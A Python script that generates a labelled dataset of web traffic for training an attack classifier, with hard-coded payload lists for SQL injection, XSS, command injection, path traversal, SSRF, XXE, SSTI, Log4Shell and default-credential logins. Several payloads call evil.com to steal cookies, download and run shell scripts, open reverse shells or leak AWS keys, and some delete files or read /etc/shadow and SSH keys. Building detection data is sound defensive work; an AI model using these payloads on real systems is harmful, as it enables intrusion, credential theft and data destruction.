"""
Virex Security — Dataset Collection & Augmentation
====================================================
يولّد dataset كبيرة ومتنوعة من payloads حقيقية
Target: 50,000+ samples — multi-class labels
Classes:
  0 = normal
  1 = sql_injection
  2 = xss
  3 = command_injection
  4 = path_traversal
  5 = ssrf
  6 = xxe
  7 = ssti
  8 = log4shell
  9 = brute_force
"""

import csv
import random
import math
import os
from pathlib import Path
from urllib.parse import quote

random.seed(42)

PROJECT_ROOT = Path(__file__).resolve().parent.parent
DATA_DIR     = PROJECT_ROOT / "data"
OUTPUT_CSV   = DATA_DIR / "ml_training_data_v2.csv"

# ─── LABEL MAP ───────────────────────────────────────────────
LABEL_MAP = {
    "normal":           0,
    "sql_injection":    1,
    "xss":              2,
    "command_injection":3,
    "path_traversal":   4,
    "ssrf":             5,
    "xxe":              6,
    "ssti":             7,
    "log4shell":        8,
    "brute_force":      9,
}

SEVERITY_MAP = {
    "normal":           "none",
    "sql_injection":    "high",
    "xss":              "medium",
    "command_injection":"critical",
    "path_traversal":   "medium",
    "ssrf":             "high",
    "xxe":              "high",
    "ssti":             "high",
    "log4shell":        "critical",
    "brute_force":      "low",
}

# ─── RAW PAYLOADS ─────────────────────────────────────────────

SQL_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "' OR 1=1#",
    "admin'--", "admin' #", "admin'/*", "' OR 'x'='x",
    "1' OR 1=1--", "1 OR 1=1", "1' AND 1=1--",
    "'; DROP TABLE users--", "1'; DROP TABLE users--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "1' UNION ALL SELECT NULL,NULL,NULL--",
    "' OR SLEEP(5)--", "1' AND SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,@@version)--",
    "id=1 AND 1=CONVERT(int,@@version)--",
    "'; EXEC xp_cmdshell('whoami')--",
    "1; EXEC xp_cmdshell('dir c:\\')--",
    "' AND EXISTS(SELECT * FROM users)--",
    "1' ORDER BY 1--", "1' ORDER BY 10--", "1' ORDER BY 100--",
    "' GROUP BY 1--", "' HAVING 1=1--",
    "1' AND (SELECT * FROM users) > 0--",
    "' OR 1=1 LIMIT 1--",
    "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
    "'; UPDATE users SET password='hacked' WHERE '1'='1'--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' OR '1'='1' /*", "' OR 1=1/*", "1 OR 1=1/*",
    "username=admin&password=' OR '1'='1",
    "id=1' AND '1'='1",
    "search=' OR 1=1--&submit=Search",
    "SELECT * FROM users WHERE id=1 OR 1=1",
    "1 UNION SELECT table_name FROM information_schema.tables",
    "' AND 1=(SELECT COUNT(*) FROM tabname); --",
    "'; SHUTDOWN--",
    "1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'",
    "' OR pg_sleep(5)--",
    "1; SELECT pg_sleep(5)--",
    "' OR BENCHMARK(1000000,MD5('a'))--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg onload=alert(document.domain)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<iframe onload=alert(1)>",
    "javascript:alert(1)",
    "javascript:alert(document.cookie)",
    "<input autofocus onfocus=alert(1)>",
    "<select onchange=alert(1)><option>1</option></select>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<link rel=import href=javascript:alert(1)>",
    "'\"><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "</script><script>alert(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert('XSS')>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%3Cimg+src%3Dx+onerror%3Dalert(1)%3E",
    "<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>",
    "<div style='background:url(javascript:alert(1))'>",
    "expression(alert(1))",
    "<style>*{background:url('javascript:alert(1)')}</style>",
    "<a href='javascript:alert(1)'>click</a>",
    "<form action='javascript:alert(1)'><input type=submit></form>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<base href='javascript:alert(1)//'><a href=/>click</a>",
    "onmouseover=alert(1)",
    "<p onmouseover='alert(1)'>hover</p>",
]

CMDI_PAYLOADS = [
    "; ls -la", "| ls -la", "& ls -la", "`ls -la`", "$(ls -la)",
    "; cat /etc/passwd", "| cat /etc/passwd", "& cat /etc/passwd",
    "`cat /etc/passwd`", "$(cat /etc/passwd)",
    "; cat /etc/shadow", "| cat /etc/shadow",
    "; id", "| id", "& id", "`id`", "$(id)",
    "; whoami", "| whoami", "& whoami",
    "; uname -a", "| uname -a",
    "; ifconfig", "| ifconfig", "; ipconfig", "| ipconfig",
    "; netstat -an", "| netstat -an",
    "; ps aux", "| ps aux",
    "; wget http://evil.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh",
    "; curl http://evil.com/shell.sh | bash",
    "; nc -e /bin/bash evil.com 4444",
    "| nc evil.com 4444 -e /bin/sh",
    "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
    "& ping -c 1 evil.com",
    "; rm -rf /tmp/*",
    "| rm -rf /",
    "; chmod 777 /etc/passwd",
    "| chmod +s /bin/bash",
    "; crontab -l", "| crontab -l",
    "; env", "| env",
    "`env`", "$(env)",
    "; echo 'hacked' > /tmp/pwned",
    "| tee /tmp/pwned",
    "127.0.0.1; ls",
    "127.0.0.1 | id",
    "127.0.0.1 && whoami",
    "%0a ls -la",
    "%0a cat /etc/passwd",
    "%0aid",
    "%3Bcat%20/etc/passwd",
    "%7Cwhoami",
    "%26%26id",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../etc/hostname",
    "../../../../proc/self/environ",
    "../../../../proc/version",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../var/www/html/config.php",
    "../../../../home/user/.ssh/id_rsa",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\boot.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///c:/windows/win.ini",
    "file:///c:/boot.ini",
    "/var/www/../../etc/passwd",
    "....//....//....//etc/passwd",
    "....\\....\\....\\etc\\passwd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..././..././..././etc/passwd",
    "/etc/passwd%00",
    "/etc/passwd%00.php",
    "../../../../etc/passwd%00",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "expect://id",
    "zip://path/to/file.zip#file.php",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1/admin",
    "http://localhost/admin",
    "http://127.0.0.1:8080/admin",
    "http://localhost:8080/manager",
    "http://0.0.0.0/",
    "http://[::1]/admin",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:9200",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://100.100.100.200/latest/meta-data/",
    "http://192.168.1.1/admin",
    "http://10.0.0.1/admin",
    "http://172.16.0.1/admin",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_INFO",
    "gopher://127.0.0.1:9200/_cat/indices",
    "ftp://127.0.0.1:21",
    "sftp://127.0.0.1:22",
    "ldap://127.0.0.1:389",
    "http://evil.com@127.0.0.1/admin",
    "http://127.0.0.1#evil.com",
    "http://spoofed.burpcollaborator.net",
    "url=http://127.0.0.1",
    "dest=http://localhost/admin",
    "redirect=http://169.254.169.254",
    "next=http://127.0.0.1:8080",
    "callback=http://internal-service/secret",
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY % load SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">]>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hostname">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
    '<?xml?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>',
    '<!DOCTYPE foo [<!ENTITY xxe "test"> <!ENTITY xxe2 "&xxe;&xxe;&xxe;">]>',
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol9 "&lol;&lol;&lol;">]><foo>&lol9;</foo>',
    '<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>',
    'xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
]

SSTI_PAYLOADS = [
    "{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
    "{{config}}", "{{config.items()}}", "{{settings}}",
    "{{request}}", "{{request.environ}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__base__.__subclasses__()}}",
    "{{[].__class__.__base__.__subclasses__()}}",
    "{{''.class.mro()[1].subclasses()}}",
    "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
    "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}{% endif %}{% endfor %}",
    "${self.module.cache.util.os.system('id')}",
    "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
    "@{3*3}",
    "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "{{''|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}",
]

LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://evil.com/a}",
    "${jndi:ldaps://evil.com/a}",
    "${jndi:rmi://evil.com/a}",
    "${jndi:dns://evil.com/a}",
    "${jndi:ldap://127.0.0.1:1389/a}",
    "${jndi:ldap://169.254.169.254/a}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
    "${${::-j}ndi:ldap://evil.com/a}",
    "${j${::-n}di:ldap://evil.com/a}",
    "${j${lower:n}di:ldap://evil.com/a}",
    "${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}",
    "${${upper:j}ndi:ldap://evil.com/a}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.com/a}",
    "X-Api-Version: ${jndi:ldap://evil.com/a}",
    "User-Agent: ${jndi:ldap://evil.com/a}",
    "${jndi:ldap://evil.com/${java:version}}",
    "${jndi:ldap://evil.com/${java:os}}",
    "${jndi:ldap://evil.com/${env:AWS_ACCESS_KEY_ID}}",
    "${jndi:ldap://evil.com/${sys:java.class.path}}",
    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//evil.com/a}",
    "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D",
    "${jndi:ldap://evil.%63om/a}",
    "$(jndi:ldap://evil.com/a)",
]

BRUTE_FORCE_PAYLOADS = [
    "username=admin&password=admin",
    "username=admin&password=password",
    "username=admin&password=123456",
    "username=admin&password=password123",
    "username=admin&password=admin123",
    "username=root&password=root",
    "username=root&password=toor",
    "username=test&password=test",
    "username=user&password=user",
    "username=administrator&password=administrator",
    "login=admin&pass=admin",
    "user=admin&pwd=password",
    "email=admin@admin.com&password=admin",
    "username=admin&password=",
    "username=&password=password",
    "user=root&password=123456",
    "username=superuser&password=superuser",
    "username=sa&password=sa",
    "username=guest&password=guest",
    "user=user1&pass=pass1",
    "username=info&password=info",
    "username=mysql&password=mysql",
    "user=oracle&password=oracle",
    "username=postgres&password=postgres",
    "username=tomcat&password=tomcat",
    "username=jenkins&password=jenkins",
    "username=hadoop&password=hadoop",
    "Authorization: Basic YWRtaW46YWRtaW4=",
    "Authorization: Basic cm9vdDpyb290",
    "Authorization: Basic dGVzdDp0ZXN0",
]

NORMAL_TEMPLATES = [
    "search query for {val}",
    "GET /products/{val} HTTP/1.1",
    "GET /users/{val}/profile HTTP/1.1",
    "POST /api/orders body={{\"item\":\"{val}\"}}",
    "GET /blog/{val} HTTP/1.1",
    "filter results by category={val}",
    "sort items by {val} ascending",
    "view page number {val}",
    "download file {val}.pdf",
    "upload image photo_{val}.jpg",
    "create new post title={val}",
    "edit comment id={val}",
    "delete item id={val}",
    "export report {val}",
    "load data from {val}",
    "username={val}&action=login",
    "GET /search?q={val}&page=1",
    "POST /api/feedback body={{\"message\":\"{val}\"}}",
    "GET /category/{val}/items",
    "PUT /api/users/{val}/settings",
    "GET /images/{val}.png",
    "POST /api/cart add item={val}",
    "GET /docs/{val}.html",
    "GET /api/status?service={val}",
    "content-type: application/json\nbody: {{\"name\":\"{val}\"}}",
]

NORMAL_VALUES = [
    "python", "javascript", "machine-learning", "data-science",
    "web-development", "mobile-apps", "database", "cloud-computing",
    "user123", "john_doe", "jane_smith", "alice", "bob",
    "electronics", "laptops", "smartphones", "tablets", "cameras",
    "order-12345", "invoice-2024", "report-january", "summary-q3",
    "home", "about", "contact", "products", "services", "faq",
    "pdf", "csv", "xlsx", "json", "xml", "txt",
    "red", "blue", "green", "size", "price", "name", "date",
    "1", "2", "3", "10", "25", "100",
    "en", "ar", "fr", "de", "es",
    "2024", "2025", "january", "february", "march",
]


# ─── AUGMENTATION FUNCTIONS ───────────────────────────────────

def url_encode(text):
    result = ""
    for ch in text:
        if ch in "'\"<>() ":
            result += f"%{ord(ch):02X}"
        else:
            result += ch
    return result

def double_encode(text):
    return url_encode(url_encode(text))

def case_mutate(text):
    return "".join(
        c.upper() if i % 2 == 0 else c.lower()
        for i, c in enumerate(text)
    )

def add_sql_comments(text):
    return text.replace(" ", "/**/").replace("SELECT", "SE/**/LECT")

def html_entity(text):
    r = text.replace("<", "&#60;").replace(">", "&#62;")
    return r.replace("'", "&#39;").replace('"', "&#34;")

def unicode_escape(text):
    result = ""
    for ch in text:
        if ch.isalpha() and random.random() < 0.3:
            result += f"\\u{ord(ch):04x}"
        else:
            result += ch
    return result

def add_http_context(payload, method="GET", param="input"):
    templates = [
        f"GET /search?{param}={payload} HTTP/1.1\nHost: target.com",
        f"POST /api/data HTTP/1.1\nHost: target.com\n\n{param}={payload}",
        f"GET /page?id={payload} HTTP/1.1\nHost: target.com",
        f"User-Agent: {payload}",
        f"X-Forwarded-For: {payload}",
        f"Referer: http://target.com/?q={payload}",
        payload,  # raw
    ]
    return random.choice(templates)

def augment_payload(payload, attack_type, n=5):
    variants = [payload]
    fns = [url_encode, double_encode, html_entity, unicode_escape]

    if attack_type == "sql_injection":
        fns.append(add_sql_comments)
    if attack_type == "command_injection":
        fns.append(case_mutate)

    for fn in fns[:n]:
        try:
            v = fn(payload)
            if v != payload:
                variants.append(v)
        except Exception:
            pass

    with_context = []
    for v in variants[:n]:
        with_context.append(add_http_context(v))
    return with_context[:n]


# ─── GENERATORS ───────────────────────────────────────────────

def generate_attack_samples(payloads, attack_type, target):
    rows = []
    base = list(payloads)
    random.shuffle(base)

    # raw payloads
    for p in base:
        rows.append((p, 1, attack_type, SEVERITY_MAP[attack_type]))

    # augmented until we hit target
    idx = 0
    while len(rows) < target:
        p = base[idx % len(base)]
        variants = augment_payload(p, attack_type, n=3)
        for v in variants:
            rows.append((v, 1, attack_type, SEVERITY_MAP[attack_type]))
            if len(rows) >= target:
                break
        idx += 1

    return rows[:target]


def generate_normal_samples(target):
    rows = []
    while len(rows) < target:
        tmpl = random.choice(NORMAL_TEMPLATES)
        val  = random.choice(NORMAL_VALUES)
        text = tmpl.replace("{val}", val)
        rows.append((text, 0, "normal", "none"))
    return rows[:target]


# ─── MAIN ─────────────────────────────────────────────────────

def build_dataset():
    print("=" * 55)
    print("  Virex — Building Enhanced Dataset v2")
    print("=" * 55)

    all_rows = []

    # normal traffic
    print("  [1/10] Normal traffic          ...", end=" ", flush=True)
    all_rows += generate_normal_samples(15000)
    print(f"done ({len([r for r in all_rows if r[2]=='normal'])})")

    attacks = [
        ("SQL Injection",      SQL_PAYLOADS,      "sql_injection",     8000),
        ("XSS",                XSS_PAYLOADS,      "xss",               8000),
        ("Command Injection",  CMDI_PAYLOADS,     "command_injection", 5000),
        ("Path Traversal",     PATH_TRAVERSAL_PAYLOADS, "path_traversal", 5000),
        ("SSRF",               SSRF_PAYLOADS,     "ssrf",              3000),
        ("XXE",                XXE_PAYLOADS,      "xxe",               2000),
        ("SSTI",               SSTI_PAYLOADS,     "ssti",              2000),
        ("Log4Shell",          LOG4SHELL_PAYLOADS,"log4shell",         2000),
        ("Brute Force",        BRUTE_FORCE_PAYLOADS,"brute_force",     3000),
    ]

    for i, (name, payloads, atype, target) in enumerate(attacks, 2):
        print(f"  [{i}/10] {name:<22} ...", end=" ", flush=True)
        rows = generate_attack_samples(payloads, atype, target)
        all_rows += rows
        print(f"done ({len(rows)})")

    random.shuffle(all_rows)

    # write CSV
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    with open(OUTPUT_CSV, "w", encoding="utf-8", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["text", "label", "attack_type", "severity"])
        writer.writerows(all_rows)

    total   = len(all_rows)
    normals = sum(1 for r in all_rows if r[1] == 0)
    attacks_count = total - normals

    print("\n" + "=" * 55)
    print(f"  Total samples : {total:,}")
    print(f"  Normal        : {normals:,}")
    print(f"  Attacks       : {attacks_count:,}")
    print(f"  Output        : {OUTPUT_CSV}")
    print("=" * 55)
    return str(OUTPUT_CSV)


if __name__ == "__main__":
    build_dataset()
